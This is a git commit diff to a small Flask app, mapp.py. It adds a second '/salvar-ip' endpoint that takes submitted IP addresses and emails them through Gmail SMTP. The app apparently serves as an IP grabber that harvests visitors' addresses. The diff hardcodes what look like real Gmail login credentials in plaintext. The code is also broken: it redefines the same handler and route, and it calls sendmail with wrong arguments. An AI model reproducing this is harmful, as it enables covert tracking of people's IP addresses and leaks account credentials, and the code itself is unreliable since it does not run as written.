8faa8ae34f57945665074e7cd56a6493a659d47f
sementinha-hostil <136841545+sementinha-hostil@users.noreply.github.com>
2023-07-29 16:47:40 -0300

    Atualizar o mapp.py

--- mapp.py
+++ mapp.py
@@ -1,5 +1,6 @@
 from flask import Flask, request
 import os
+import smtplib
 
 app = Flask(__name__)
 
@@ -10,6 +11,38 @@ def salvar_ip():
     with open(caminho_arquivo, 'a') as arquivo:
         arquivo.write(ip + '\n')
     return '', 200
+
+
+
+
+
+@app.route('/salvar-ip', methods=['POST'])
+def salvar_ip():
+    ip = request.json['ip']
+# Create an SMTP object
+    smtp = smtplib.SMTP('smtp.gmail.com', 587)
+
+# Set the SMTP server, username, and password
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login('m4ria.gama@gmail.com', 'Prosopopei4')
+
+# Set the sender and recipient
+    sender = 'm4ria.gama@gmail.com'
+    recipient = 'm4ria.gama@gmail.com'
+
+# Set the email subject
+    subject = 'ta aqui'
+
+# Set the email body
+    body = ip
+
+# Send the email
+    smtp.sendmail(sender, recipient, subject, body)
+
+# Close the connection
+    smtp.quit()
+
 
 if __name__ == '__main__':
     app.run()
